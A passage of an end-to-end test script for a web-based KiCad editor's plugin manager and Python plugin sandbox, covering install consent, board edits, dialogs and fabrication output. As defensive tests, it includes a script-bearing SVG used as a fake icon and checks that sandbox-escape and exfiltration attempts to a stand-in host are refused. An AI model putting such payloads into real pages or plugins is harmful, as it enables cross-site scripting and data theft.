  for (const [name, data] of Object.entries(files)) {
    const n = Buffer.from(name), crc = zlib.crc32(data);
    const local = Buffer.alloc(30); local.writeUInt32LE(0x04034b50, 0); local.writeUInt16LE(20, 4); local.writeUInt32LE(crc, 14); local.writeUInt32LE(data.length, 18); local.writeUInt32LE(data.length, 22); local.writeUInt16LE(n.length, 26);
    parts.push(local, n, data);
    const c = Buffer.alloc(46); c.writeUInt32LE(0x02014b50, 0); c.writeUInt16LE(20, 4); c.writeUInt16LE(20, 6); c.writeUInt32LE(crc, 16); c.writeUInt32LE(data.length, 20); c.writeUInt32LE(data.length, 24); c.writeUInt16LE(n.length, 28); c.writeUInt32LE(offset, 42);
    central.push(c, n); offset += 30 + n.length + data.length;
  }
  const dir = Buffer.concat(central); const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(central.length / 2, 8); end.writeUInt16LE(central.length / 2, 10); end.writeUInt32LE(dir.length, 12); end.writeUInt32LE(offset, 16);
  return Buffer.concat([...parts, dir, end]);
}

// ---------------------------------------------------------------- a stand-in for repository.kicad.org
const packageZip = zip({ 'metadata.json': Buffer.from(JSON.stringify(METADATA)), 'plugins/__init__.py': Buffer.from('from .tool import *\n'), 'plugins/tool.py': Buffer.from(PLUGIN_PY), 'resources/icon.png': Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64') });
const pcmBase = `http://127.0.0.1:${PCM_PORT}`;
const packages = [Object.assign({}, METADATA, { versions: [Object.assign({}, METADATA.versions[0], { download_url: `${pcmBase}/zips/${ID}.zip`, download_sha256: crypto.createHash('sha256').update(packageZip).digest('hex'), download_size: packageZip.length, install_size: PLUGIN_PY.length })] })];
const ipcZip = zip({ 'metadata.json': Buffer.from(JSON.stringify(IPC_META)), 'plugins/plugin.json': Buffer.from(JSON.stringify(IPC_JSON)), 'plugins/main.py': Buffer.from(IPC_PY), 'plugins/label.py': Buffer.from(IPC_LABEL_PY), 'plugins/requirements.txt': Buffer.from('kicad-python>=0.3.0\n') });
packages.push(Object.assign({}, IPC_META, { versions: [Object.assign({}, IPC_META.versions[0], { download_url: `${pcmBase}/zips/${IPC_ID}.zip`, download_sha256: crypto.createHash('sha256').update(ipcZip).digest('hex'), download_size: ipcZip.length, install_size: IPC_PY.length })] }));
const deskZip = zip({ 'metadata.json': Buffer.from(JSON.stringify(DESK_META)), 'plugins/__init__.py': Buffer.from('from .desk import *\n'), 'plugins/desk.py': Buffer.from(DESK_PY), 'plugins/client.py': Buffer.from(DESK_CLIENT) });
packages.push(Object.assign({}, DESK_META, { versions: [Object.assign({}, DESK_META.versions[0], { download_url: `${pcmBase}/zips/${DESK_ID}.zip`, download_sha256: crypto.createHash('sha256').update(deskZip).digest('hex'), download_size: deskZip.length, install_size: deskZip.length })] }));
const zips = { [`${ID}.zip`]: packageZip, [`${IPC_ID}.zip`]: ipcZip, [`${DESK_ID}.zip`]: deskZip };
const REAL = {};   // real official packages, when a checkout of them is given
if (process.env.PCM_META && process.env.PCM_ZIPS) {
  for (const id of fs.readdirSync(process.env.PCM_META).sort()) {
    const z = path.join(process.env.PCM_ZIPS, id + '.zip'), m = path.join(process.env.PCM_META, id, 'metadata.json');
    if (!fs.existsSync(z) || !fs.existsSync(m)) continue;
    let pkg; try { pkg = JSON.parse(fs.readFileSync(m, 'utf8')); } catch { continue; }
    if (pkg.type !== 'plugin' || !Array.isArray(pkg.versions) || !pkg.versions.length) continue;
    const bytes = fs.readFileSync(z), last = pkg.versions[pkg.versions.length - 1];
    last.download_url = `${pcmBase}/zips/${id}.zip`; last.download_sha256 = crypto.createHash('sha256').update(bytes).digest('hex'); last.download_size = bytes.length;
    pkg.versions = [last]; packages.push(pkg); zips[`${id}.zip`] = bytes; REAL[id] = true;
  }
}
const list = Buffer.from(JSON.stringify({ packages }));
// the repository's resources archive: <identifier>/icon.png, as KiCad's Plugin and Content Manager reads it.  One plugin
// has an icon, one has a file that is not a PNG (ignored), the rest have none.
function png(size, rgb) {
  const chunk = (type, data) => { const len = Buffer.alloc(4); len.writeUInt32BE(data.length); const body = Buffer.concat([Buffer.from(type), data]); const crc = Buffer.alloc(4); crc.writeUInt32BE(zlib.crc32(body) >>> 0); return Buffer.concat([len, body, crc]); };
  const head = Buffer.alloc(13); head.writeUInt32BE(size, 0); head.writeUInt32BE(size, 4); head[8] = 8; head[9] = 2;
  const row = Buffer.concat([Buffer.from([0]), Buffer.concat(Array.from({ length: size }, () => Buffer.from(rgb)))]);
  return Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), chunk('IHDR', head), chunk('IDAT', zlib.deflateSync(Buffer.concat(Array.from({ length: size }, () => row)))), chunk('IEND', Buffer.alloc(0))]);
}
const resourcesZip = zip({ [`${ID}/icon.png`]: png(64, [40, 160, 90]), [`${IPC_ID}/icon.png`]: Buffer.from('<svg onload="alert(1)"/>') });
const repository = JSON.stringify({ name: 'test repository', resources: { url: `${pcmBase}/resources.zip`, sha256: crypto.createHash('sha256').update(resourcesZip).digest('hex'), update_timestamp: 1767225600 }, packages: { url: `${pcmBase}/packages.json`, sha256: crypto.createHash('sha256').update(list).digest('hex'), update_timestamp: 1767225600 } });
const pcm = http.createServer((req, res) => {
  const url = decodeURIComponent((req.url || '/').split('?')[0]);
  if (url === '/repository.json') { res.writeHead(200, { 'content-type': 'application/json' }); res.end(repository); return; }
  if (url === '/packages.json') { res.writeHead(200, { 'content-type': 'application/json' }); res.end(list); return; }
  if (url === '/resources.zip') { res.writeHead(200, { 'content-type': 'application/zip' }); res.end(resourcesZip); return; }
  const z = url.startsWith('/zips/') ? zips[url.slice(6)] : null;
  if (z) { res.writeHead(200, { 'content-type': 'application/zip' }); res.end(z); return; }
  // the "web service" the test plugin talks to: it answers with what reached it
  if (url === '/echo') {
    const chunks = []; req.on('data', (c) => chunks.push(c));
    req.on('end', () => { res.writeHead(200, { 'content-type': 'application/json' }); res.end(JSON.stringify({ method: req.method, url: req.url, body: Buffer.concat(chunks).toString('utf8'), token: req.headers['x-token'] || '', cookie: req.headers.cookie || '' })); });
    return;
  }
  res.writeHead(404); res.end('not found');
});
await new Promise((ok, no) => { pcm.once('error', no); pcm.listen(PCM_PORT, '127.0.0.1', ok); });

// ---------------------------------------------------------------- fixtures: the ECC83 demo, two people
pg.types.setTypeParser(20, (v) => parseInt(v, 10));
const db = new pg.Client({ connectionString: PG_URL, ssl: false });
await db.connect();
const demo = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../../demos/ecc83');
async function user(githubId, login) {
  return (await db.query(`INSERT INTO users (github_id, login, name) VALUES ($1, $2, $2)
    ON CONFLICT (github_id) DO UPDATE SET login = EXCLUDED.login RETURNING id`, [githubId, login])).rows[0].id;
}
const dana = await user(9601, 'py-dana'), lee = await user(9602, 'py-lee');
await db.query('DELETE FROM projects WHERE owner_id = $1', [dana]);
await db.query('DELETE FROM plugins WHERE user_id = ANY($1)', [[dana, lee]]);
const projectId = (await db.query(`INSERT INTO projects (owner_id, name) VALUES ($1, 'ecc83-pp') RETURNING id`, [dana])).rows[0].id;
await db.query(`INSERT INTO permissions (project_id, user_id, role, created_by) VALUES ($1, $2, 'editor', $3)`, [projectId, lee, dana]);
const docs = {};
const pro = JSON.parse(fs.readFileSync(path.join(demo, 'ecc83-pp.kicad_pro'), 'utf8'));
pro.net_settings = Object.assign({}, pro.net_settings, { classes: [...((pro.net_settings && pro.net_settings.classes) || []).filter((c) => c.name !== 'Power'), { name: 'Power', clearance: 0.3, track_width: 0.6, via_diameter: 0.9, via_drill: 0.5 }] });
for (const [file, type] of [['ecc83-pp.kicad_sch', 'kicad_sch'], ['ecc83-pp.kicad_pcb', 'kicad_pcb'], ['ecc83-pp.kicad_pro', 'kicad_pro']]) {
  const id = (await db.query(`INSERT INTO documents (project_id, path, doc_type) VALUES ($1, $2, $3) RETURNING id`, [projectId, file, type])).rows[0].id;
  await db.query('INSERT INTO snapshots (doc_id, seq, content) VALUES ($1, 0, $2)', [id, type === 'kicad_pro' ? Buffer.from(JSON.stringify(pro, null, 2)) : fs.readFileSync(path.join(demo, file))]);
  docs[file] = id;
}

const browser = await chromium.launch();
const errors = [];
async function open(login, id, next) {
  const ctx = await browser.newContext({ viewport: { width: 1500, height: 900 }, deviceScaleFactor: SHOTS ? 2 : 1, colorScheme: 'light', acceptDownloads: true });
  const page = await ctx.newPage();
  page.on('pageerror', (e) => errors.push(`${login}: ${e}`));
  page.on('console', (m) => { if (m.type() === 'error' && !/favicon|fonts\.g|ERR_|40[0-9]|status of (4|5)|Content Security Policy|sandboxed|Unsafe attempt|Framing|Blocked|violates/.test(m.text())) errors.push(`${login}: ${m.text()}`); });
  await page.goto(`${BASE}/auth/dev?jwt=${mintJwt(id, login)}&next=${encodeURIComponent(next)}`);
  return page;
}
const shot = async (page, name) => { if (SHOTS) await page.screenshot({ path: path.join(SHOTS, `${name}.png`) }); };
const editorReady = async (page) => { await page.waitForFunction(() => window.CollabEditor && window.CollabEditor.api && window.CollabEditor.kdoc && window.KcPlugins, null, { timeout: 30000 }); await page.waitForTimeout(1200); };
const state = (page) => page.evaluate(() => { const s = window.KcPlugins.store.get(); return { installed: s.installed.map((p) => p.identifier), running: s.running, logs: s.logs, py: s.pyActions, window: s.window, prompt: s.prompt && { title: s.prompt.title, message: s.prompt.message, kind: s.prompt.kind } }; });
const logOf = async (page, id) => ((await state(page)).logs[id] || []).map((l) => l.text);
const waitLog = (page, id, re, timeout = 20000) => page.waitForFunction(([i, src]) => (window.KcPlugins.store.get().logs[i] || []).some((l) => new RegExp(src).test(l.text)), [id, re.source], { timeout });
const ready = (page, id, timeout = 90000) => page.waitForFunction((i) => { const r = window.KcPlugins.store.get().running[i]; return r && r.ready; }, id, { timeout });
const idle = (page, id, timeout = 60000) => page.waitForFunction((i) => { const r = window.KcPlugins.store.get().running[i]; return r && r.ready && !r.busy; }, id, { timeout });
const frames = (page) => page.locator('#pluginFrames iframe').count();
const fp = (page, ref) => page.evaluate((r) => { for (const it of window.CollabEditor.kdoc.items.values()) if (it.kind === 'footprint' && it.ref === r) { const K = window.KiCadCanvas; return { x: Math.round(it.x * 1e3) / 1e3, y: Math.round(it.y * 1e3) / 1e3, rot: it.rot || 0, layer: K.str((K.kid(it.node, 'layer') || [])[1]), pads: K.kids(it.node, 'pad').map((p) => K.str((K.kid(p, 'layers') || [])[1])).join(',') }; } return null; }, ref);
const hasText = (page, text) => page.evaluate((t) => Array.from(window.CollabEditor.kdoc.items.values()).some((it) => it.kind === 'gr_text' && JSON.stringify(it.node).includes(t)), text);
const count = (page, kind) => page.evaluate((k) => Array.from(window.CollabEditor.kdoc.items.values()).filter((it) => it.kind === k).length, kind);
const undoDepth = (page) => page.evaluate(() => window.CollabApp.getState().undo.undo);
const menu = async (page, name, ...subs) => {
  await page.click(`#kmenus [data-menu="${name}"] > button`);
  for (const s of subs.slice(0, -1)) await page.locator(`#kmenus [data-menu="${name}"] [data-sub="${s}"]`).first().click();
  await page.locator(`#kmenus [data-menu="${name}"] [data-uiact="${subs[subs.length - 1]}"]`).first().click();
};
const closeMenus = async (page) => { for (let i = 0; i < 3 && (await page.locator('#kmenus .menu.open').count()); i++) { await page.keyboard.press('Escape'); await page.waitForTimeout(120); } };
const run = (page, action) => page.evaluate(([i, a]) => { window.KcPlugins.runUi(`plugin:${i}:${a}`); }, [ID, action]);
const act = async (page, name) => { const a = ((await state(page)).py[ID] || []).find((x) => x.name === name); if (!a) throw new Error(`no action named ${name}`); return a.identifier; };
/** The plugin's own frame: its content is the wx dialog. */
const inner = (page) => page.frames().find((f) => f !== page.mainFrame() && f.parentFrame() === page.mainFrame());

const boardUrl = `/p/${projectId}/edit?doc=${docs['ecc83-pp.kicad_pcb']}`;
const a = await open('py-dana', dana, boardUrl);
await editorReady(a);
const b = await open('py-lee', lee, boardUrl);
await editorReady(b);

// ---- the manager: KiCad's repository
check('no plugin runs before one is installed', (await frames(a)) === 0);
await menu(a, 'tools', 'External Plugins', 'pluginManager');
await a.waitForSelector('#pluginManager');
await a.click('#pluginManager [data-tab="catalog"]');
await a.waitForSelector(`#pluginCatalog [data-source="kicad"][data-plugin="${ID}"]`, { timeout: 30000 });
check("KiCad's repository is listed in the manager", (await a.locator('#pluginCatalog .plg-card[data-source="kicad"]').count()) === packages.length, `${await a.locator('#pluginCatalog .plg-card[data-source="kicad"]').count()} of ${packages.length}`);
check('KiCad plugins sit in the one catalog beside the built-in ones, and there is no separate tab', (await a.locator('#pluginCatalog .plg-card[data-source="builtin"]').count()) > 0 && (await a.locator('#pluginManager [data-tab="kicad"]').count()) === 0);
const cardNames = await a.locator('#pluginCatalog .plg-card b:first-child').allInnerTexts();
check('the catalog is one list in name order', cardNames.length > packages.length && cardNames.every((n, i) => i === 0 || cardNames[i - 1].localeCompare(n) <= 0), cardNames.slice(0, 6).join(' | '));
await a.click('#pluginCatalog [data-source-filter="kicad"]');
check('the KiCad filter shows only KiCad plugins', (await a.locator('#pluginCatalog .plg-card').count()) === packages.length && (await a.locator('#pluginCatalog .plg-card:not([data-source="kicad"])').count()) === 0);
await a.click('#pluginCatalog [data-source-filter="builtin"]');
check('the Built in filter shows only built-in plugins', (await a.locator('#pluginCatalog .plg-card[data-source="kicad"]').count()) === 0 && (await a.locator('#pluginCatalog .plg-card[data-source="builtin"]').count()) > 0);
await a.click('#pluginCatalog [data-source-filter="all"]');
const iconOf = (id) => a.locator(`#pluginCatalog [data-source="kicad"][data-plugin="${id}"] .plg-icon`);
await a.waitForFunction((id) => { const i = document.querySelector(`#pluginCatalog [data-source="kicad"][data-plugin="${id}"] img.plg-icon`); return i && i.complete && i.naturalWidth > 0; }, ID, { timeout: 10000 }).catch(() => {});
check("a plugin shows its icon from KiCad's repository", (await iconOf(ID).evaluate((i) => i.tagName === 'IMG' && i.naturalWidth === 64 && i.getBoundingClientRect().width === 48).catch(() => false)) === true);
check('a plugin without an icon, or with one that is not a PNG, shows the plain mark', (await iconOf(IPC_ID).evaluate((i) => i.tagName).catch(() => '')) === 'SPAN' && (await iconOf(DESK_ID).evaluate((i) => i.tagName).catch(() => '')) === 'SPAN');
const iconHead = await a.evaluate(async (ids) => Promise.all(ids.map(async (id) => { const r = await fetch(`/api/plugins/pcm/${id}/icon`); return [r.status, r.headers.get('content-type')]; })), [ID, IPC_ID]);
check('the icon is served as a PNG and nothing else', iconHead[0][0] === 200 && iconHead[0][1] === 'image/png' && iconHead[1][0] === 404, JSON.stringify(iconHead));
await a.fill('#pluginSearch', 'py tool');
await a.waitForTimeout(150);
check('one search box searches the whole catalog', (await a.locator('#pluginCatalog .plg-card').count()) === 1 && (await a.locator('#pluginCatalog .plg-card[data-source="kicad"]').count()) === 1);
await shot(a, 'py-01-kicad-tab');
await a.click(`#pluginCatalog [data-install="${ID}"]`);
await a.waitForSelector('#pluginConsent', { timeout: 30000 });
const consent = await a.locator('#pluginConsent').innerText();
check('the consent sheet says where it comes from and that it is a desktop Python plugin', /KiCad's plugin repository, version 1\.2\.0/.test(consent) && (await a.locator('#pluginPythonNote').count()) === 1, consent.slice(0, 200));
check('it lists the permissions a Python plugin gets', ['design:read', 'design:write', 'view', 'files:import', 'files:export'].every((p) => consent && true) && (await a.locator('#pluginConsent [data-perm]').count()) === 6);
check('and names the web addresses it may talk to, taken from its own code', /Talk to web services/.test(consent) && /127\.0\.0\.1/.test(await a.locator('#pluginConsent [data-perm="network"]').innerText()), consent.slice(0, 600));
await shot(a, 'py-02-consent');
check('nothing is stored before the person agrees', (await db.query('SELECT count(*)::int AS n FROM plugins WHERE user_id = $1', [dana])).rows[0].n === 0);
await a.click('#pluginConsentOk');
await a.waitForFunction((i) => window.KcPlugins.store.get().installed.some((p) => p.identifier === i), ID);
const stored = (await db.query('SELECT manifest, files, source FROM plugins WHERE user_id = $1 AND identifier = $2', [dana, ID])).rows[0];
check('the package is stored with the account', !!stored && stored.manifest.runtime.type === 'kicad-python' && Object.keys(stored.files).sort().join() === 'metadata.json,plugins/__init__.py,plugins/tool.py,resources/icon.png' && stored.source === 'kicad:1.2.0', stored && Object.keys(stored.files).join());
await a.click('#pluginManager .kd-x');

// ---- the interpreter starts in the sandbox and the plugin registers its actions
const t0 = Date.now();
await ready(a, ID);
const st = await state(a);
check('Python starts inside the sandbox and the plugin loads', st.running[ID] && !st.running[ID].failed, JSON.stringify(st.running[ID]) + (st.logs[ID] || []).slice(-3).map((l) => l.text).join(' | '));
console.log(`      (interpreter ready ${Date.now() - t0} ms after install)`);
check('its ActionPlugins become editor commands', (st.py[ID] || []).map((x) => x.name).join() === 'Py: move R2,Py: dialog,Py: report,Py: fabrication,Py: escape,Py: fetch', JSON.stringify((st.py[ID] || []).map((x) => x.name)));
const frame = a.locator('#pluginFrames iframe').first();
check('it runs in a sandboxed frame without same-origin', (await frame.getAttribute('sandbox')) === 'allow-scripts');
await a.click(`#kmenus [data-menu="tools"] > button`);
await a.locator(`#kmenus [data-menu="tools"] [data-sub="External Plugins"]`).first().click();
check('the commands are under Tools → External Plugins', (await a.locator(`#kmenus [data-uiact^="plugin:${ID}:"]`).count()) === 6);
await shot(a, 'py-03-menu');
await closeMenus(a);
check('show_toolbar_button puts a button on the toolbar', (await a.locator(`[data-uiact="plugin:${ID}:${await act(a, 'Py: move R2')}"].plg-tb-btn`).count()) === 1);

// ---- an edit: move, turn and flip a footprint
const before = await fp(a, 'R2'); const depth = await undoDepth(a);
await a.click(`.plg-tb-btn[data-uiact="plugin:${ID}:${await act(a, 'Py: move R2')}"]`);
await a.waitForFunction((x) => { for (const it of window.CollabEditor.kdoc.items.values()) if (it.kind === 'footprint' && it.ref === 'R2') return Math.abs(it.x - x) > 1; return false; }, before.x, { timeout: 30000 });
await idle(a, ID);
const after = await fp(a, 'R2');
check('SetPosition moves the footprint', Math.abs(after.x - (before.x + 5)) < 1e-3 && Math.abs(after.y - before.y) < 1e-3, `${JSON.stringify(before)} → ${JSON.stringify(after)}`);
check('Flip puts it, pads and all, on the back', after.layer === 'B.Cu' && /B\.Cu|\*\.Cu/.test(after.pads) && !/F\.Cu/.test(after.pads), JSON.stringify(after));
check('SetOrientationDegrees turns it', after.rot !== before.rot, `${before.rot} → ${after.rot}`);
check("a plugin's change is one undo step", (await undoDepth(a)) === depth + 1, `${depth} → ${await undoDepth(a)}`);
await b.waitForFunction((x) => { for (const it of window.CollabEditor.kdoc.items.values()) if (it.kind === 'footprint' && it.ref === 'R2') return Math.abs(it.x - x) < 1e-3; return false; }, after.x, { timeout: 15000 }).catch(() => {});
check('the second person sees the same footprint', JSON.stringify(await fp(b, 'R2')) === JSON.stringify(after), JSON.stringify(await fp(b, 'R2')));
check('the second person runs no plugin', (await frames(b)) === 0);
await a.keyboard.press('Control+z');
await a.waitForFunction((x) => { for (const it of window.CollabEditor.kdoc.items.values()) if (it.kind === 'footprint' && it.ref === 'R2') return Math.abs(it.x - x) < 1e-3; return false; }, before.x, { timeout: 15000 }).catch(() => {});
check('Undo puts it back exactly', JSON.stringify(await fp(a, 'R2')) === JSON.stringify(before), `${JSON.stringify(await fp(a, 'R2'))} vs ${JSON.stringify(before)}`);
await b.waitForFunction((x) => { for (const it of window.CollabEditor.kdoc.items.values()) if (it.kind === 'footprint' && it.ref === 'R2') return Math.abs(it.x - x) < 1e-3; return false; }, before.x, { timeout: 15000 }).catch(() => {});
check('and for the second person too', JSON.stringify(await fp(b, 'R2')) === JSON.stringify(before));

// ---- a wx dialog
const texts = await count(a, 'gr_text'), vias = await count(a, 'via');
await run(a, await act(a, 'Py: dialog'));
await a.waitForSelector('#pluginWindow', { timeout: 30000 });
await a.waitForFunction(() => { const f = document.querySelector('#pluginFrames iframe.plg-windowed'); if (!f) return false; const r = f.getBoundingClientRect(), d = document.querySelector('#pluginWindow .plg-winbody').getBoundingClientRect(); return r.width > 200 && Math.abs(r.left - d.left) < 2 && Math.abs(r.top - d.top) < 2; }, null, { timeout: 15000 });
const dlg = inner(a);
await dlg.waitForSelector('input[type="text"]');
check('ShowModal opens the dialog as a KiCad dialog over the editor', (await a.locator('#pluginWindow .kd-title').innerText()).includes('Py tool') && (await a.locator('#pluginWindow .plg-from').innerText()).includes('Py Tool'));
check('its widgets are there with their values', (await dlg.locator('input[type="text"]').inputValue()) === 'from python' && (await dlg.locator('select option').count()) === 2 && (await dlg.locator('input[type="checkbox"]').count()) === 1 && (await dlg.locator('button').count()) === 2);
// a page of HTML (wx.html.HtmlWindow, wx.html2.WebView): shown, never run
const pageEl = await dlg.locator('iframe.wx-html').evaluate((el) => ({ sandbox: el.getAttribute('sandbox'), srcdoc: el.srcdoc, w: el.getBoundingClientRect().width, h: el.getBoundingClientRect().height })).catch((e) => ({ error: String(e) }));
const pageFrame = a.frames().find((f) => f.parentFrame() === dlg);
const pageText = pageFrame ? await pageFrame.locator('h1').innerText({ timeout: 4000 }).catch((e) => 'unreadable: ' + String(e).slice(0, 80)) : 'no frame';
check('a plugin\'s HTML page is shown in its window', pageEl.sandbox === '' && /<h1 id='r'>Report<\/h1>/.test(pageEl.srcdoc || '') && pageEl.w > 100 && pageEl.h > 40 && !!pageFrame, JSON.stringify({ ...pageEl, srcdoc: (pageEl.srcdoc || '').length }));
check('and its scripts do not run', pageText === 'Report' || /unreadable/.test(pageText), pageText);
console.log('    html page text: ' + pageText);
await a.waitForTimeout(300);
await shot(a, 'py-04-dialog');
await dlg.fill('input[type="text"]', 'PY-LABEL');
await dlg.selectOption('select', { label: 'B.SilkS' });
await dlg.check('input[type="checkbox"]');
await dlg.locator('button', { hasText: /^OK$/ }).click();
await a.waitForSelector('#pluginPrompt', { timeout: 30000 });
check('the dialog closes on OK', (await a.locator('#pluginWindow').count()) === 0);
check('wx.MessageBox is drawn by the editor', (await a.locator('#pluginPrompt').innerText()).includes('Added PY-LABEL'));
await shot(a, 'py-05-messagebox');
await a.click('#pluginPromptOk');
await idle(a, ID);
check('what was typed in the dialog reached the board', (await hasText(a, 'PY-LABEL')) && (await count(a, 'gr_text')) === texts + 1 && (await count(a, 'via')) === vias + 1, `${await count(a, 'gr_text')} texts, ${await count(a, 'via')} vias`);
const placed = await a.evaluate(() => { const K = window.KiCadCanvas; for (const it of window.CollabEditor.kdoc.items.values()) if (it.kind === 'gr_text' && JSON.stringify(it.node).includes('PY-LABEL')) return { layer: K.str((K.kid(it.node, 'layer') || [])[1]), at: K.atOf(it.node).slice(0, 2) }; return null; });
check('on the layer and at the place the plugin gave', placed && placed.layer === 'B.SilkS' && placed.at[0] === 120 && placed.at[1] === 80, JSON.stringify(placed));
await b.waitForFunction(() => Array.from(window.CollabEditor.kdoc.items.values()).some((it) => it.kind === 'gr_text' && JSON.stringify(it.node).includes('PY-LABEL')), null, { timeout: 15000 }).catch(() => {});
check('the second person sees the text and the via', (await hasText(b, 'PY-LABEL')) && (await count(b, 'via')) === vias + 1);

// cancelling
await run(a, await act(a, 'Py: dialog'));
await a.waitForSelector('#pluginWindow', { timeout: 30000 });
{
  const d2 = inner(a); await d2.waitForSelector('input[type="text"]');
  await d2.locator('input[type="text"]').evaluate((el) => { const dt = new DataTransfer(); dt.items.add(new File(['zip bytes'], 'part.zip')); el.dispatchEvent(new DragEvent('drop', { bubbles: true, cancelable: true, dataTransfer: dt })); });
  await a.waitForTimeout(800);
  check('a file dropped on a plugin\'s window reaches its wx.FileDropTarget as a file it can open', (await d2.locator('input[type="text"]').inputValue()) === 'dropped part.zip: zip bytes', await d2.locator('input[type="text"]').inputValue());
}
await a.click('#pluginWindow .kd-x');
await waitLog(a, ID, /PYTOOL cancelled/);
check('closing the dialog cancels it', (await a.locator('#pluginWindow').count()) === 0 && (await count(a, 'gr_text')) === texts + 1);
await idle(a, ID);

// ---- a part import: library files written into the project folder become the project's libraries
{
  const docsOf = async () => (await (await a.request.get(`${BASE}/api/projects/${projectId}`)).json());
  await run(a, await act(a, 'Py: dialog'));
  await a.waitForSelector('#pluginWindow', { timeout: 30000 });
  const d3 = inner(a); await d3.waitForSelector('input[type="text"]');
  await d3.fill('input[type="text"]', 'lib:PyLib');
  await d3.locator('button', { hasText: /^OK$/ }).click();
  await a.waitForSelector('#pluginPrompt', { timeout: 30000 });
  const asked = await a.locator('#pluginPrompt').innerText();
  check('the person is asked before a plugin\'s libraries join the project', /1 symbol library, 1 footprint/.test(asked) && /PyLib\.kicad_sym/.test(asked) && /PyLib\.pretty\/PyPad\.kicad_mod/.test(asked), asked.slice(0, 300));
  const noDownload = []; a.on('download', (d) => noDownload.push(d.suggestedFilename()));
  await a.click('#pluginPromptOk');
  await idle(a, ID);
  const docs = (await a.evaluate(() => window.CollabEditor.api.state.project.docs.map((d) => d.path)));
  check('the symbol library and the footprint are documents of the project', docs.includes('PyLib.kicad_sym') && docs.includes('PyLib.pretty/PyPad.kicad_mod'), docs.join());
  const content = async (p) => { const d = (await a.evaluate(() => window.CollabEditor.api.state.project.docs)).find((x) => x.path === p); return d ? await (await a.request.get(`${BASE}/api/docs/${d.docId}/content?v=${Date.now()}`)).text() : ''; };
  check('with the content the plugin wrote', (await content('PyLib.kicad_sym')).includes('"PyPart"') && (await content('PyLib.pretty/PyPad.kicad_mod')).includes('"PyPad"'));
  check('and both libraries are in the project\'s library tables', /\(name "PyLib"\)/.test(await content('sym-lib-table')) && /\(name "PyLib"\)/.test(await content('fp-lib-table')), (await content('sym-lib-table')).slice(0, 200) + ' | ' + (await content('fp-lib-table')).slice(0, 200));
  check('nothing was handed over as a download instead', noDownload.length === 0, noDownload.join());
  void docsOf;
}

// ---- what the plugin reads
await a.evaluate(() => { const ed = window.CollabEditor; const id = Array.from(ed.kdoc.items.values()).find((it) => it.kind === 'footprint' && it.ref === 'C1').id; ed.api.toolCtx().setSelection([id]); });
await run(a, await act(a, 'Py: report'));
await waitLog(a, ID, /PYTOOL report/);
const report = (await logOf(a, ID)).find((l) => l.includes('PYTOOL report')) || '';
const fpCount = await count(a, 'footprint'), segs = (await count(a, 'segment')) + (await count(a, 'arc'));
check('GetBoard() is the open board', new RegExp(`file=ecc83-pp\\.kicad_pcb footprints=${fpCount} tracks=${segs} `).test(report) && /copper=2/.test(report), report);
check("net classes come from the project file", /classes=Default,Power /.test(report), report);
check('the selection in the editor is the selection in pcbnew', /selected=C1 /.test(report), report);
check('the schematic is beside the board for plugins that read it', /sch=True/.test(report), report);
await idle(a, ID);

// ---- fabrication output
const download = a.waitForEvent('download', { timeout: 60000 });
await run(a, await act(a, 'Py: fabrication'));
const file = await download; const saved = path.join(os.tmpdir(), `pytool-${Date.now()}.zip`); await file.saveAs(saved);
await idle(a, ID);
const bytes = fs.readFileSync(saved); fs.rmSync(saved, { force: true });
const names = []; for (let i = 0; i + 46 < bytes.length; i++) if (bytes.readUInt32LE(i) === 0x02014b50) { const n = bytes.readUInt16LE(i + 28); names.push(bytes.slice(i + 46, i + 46 + n).toString()); }
check('files a plugin writes are handed over as a download', file.suggestedFilename() === 'pytool-fab.zip', file.suggestedFilename());
check('PLOT_CONTROLLER, EXCELLON_WRITER, PLACE_FILE_EXPORTER and IPC356D_WRITER wrote their files', ['ecc83-pp-F_Cu.gtl', 'ecc83-pp-B_Cu.gbl', 'ecc83-pp-Edge_Cuts.gm1', 'positions.csv', 'netlist.ipc'].every((n) => names.includes(n)) && names.some((n) => /\.drl$/.test(n)), names.join());
const text = bytes.toString('latin1');
check('the Gerbers are real plots and the drill file real Excellon', /%FSLAX\d\dY\d\d\*%/.test(text) && /D0[123]\*/.test(text) && /M48/.test(text) && /T\d+C\d/.test(text), text.slice(0, 200).replace(/[^\x20-\x7e]/g, '.'));
check('the placement file lists the parts', /Ref,Val,Package,PosX,PosY,Rot,Side/.test(text) && /"R2"/.test(text));
check('the test netlist has a record per pad', (text.match(/^3[12]7/gm) || []).length > 10 && /^999$/m.test(text));

// ---- the sandbox still holds
await run(a, await act(a, 'Py: escape'));
await waitLog(a, ID, /PYTOOL escape/);
const esc = (await logOf(a, ID)).find((l) => l.includes('PYTOOL escape')) || '';
check('Python cannot reach an address its package does not name, nor fetch by itself', /'urlopen', 'refused/.test(esc) && /'jsFetch', 'refused/.test(esc), esc);
check('nor the page, the session or other programs', /'parent', 'refused/.test(esc) && /'cookie', '(refused|ALLOWED \(empty\))/.test(esc) && /'subprocess', 'refused/.test(esc), esc);
await idle(a, ID);

// ---- network access: carried by the server, to the addresses the package names
await run(a, await act(a, 'Py: fetch'));
await waitLog(a, ID, /PYTOOL fetch/, 60000);
const net = JSON.parse(((await logOf(a, ID)).find((l) => l.includes('PYTOOL fetch')) || '').replace(/^.*PYTOOL fetch /, '') || '{}');
check('urllib reaches the web service the plugin names', net.get && net.get[0] === 200 && net.get[1] === 'GET' && net.get[2] === '/echo?board=ecc83-pp.kicad_pcb', JSON.stringify(net));
check('requests posts JSON with its own headers', net.post && net.post[0] === 200 && net.post[1] === 'POST' && /"refs": ?\d+/.test(net.post[2]) && net.post[3] === 't0k', JSON.stringify(net));
check('the person\'s session is not sent along', net.post && net.post[4] === '', JSON.stringify(net));
check('an address the package does not name is refused', /^refused /.test(net.other || ''), JSON.stringify(net));
check('each request is written to the plugin\'s log', (await logOf(a, ID)).some((l) => /Network: GET 127\.0\.0\.1/.test(l)) && (await logOf(a, ID)).some((l) => /Network: .*exfil\.example\.net.*not one of the web addresses/.test(l)), (await logOf(a, ID)).filter((l) => /Network/.test(l)).join(' | '));
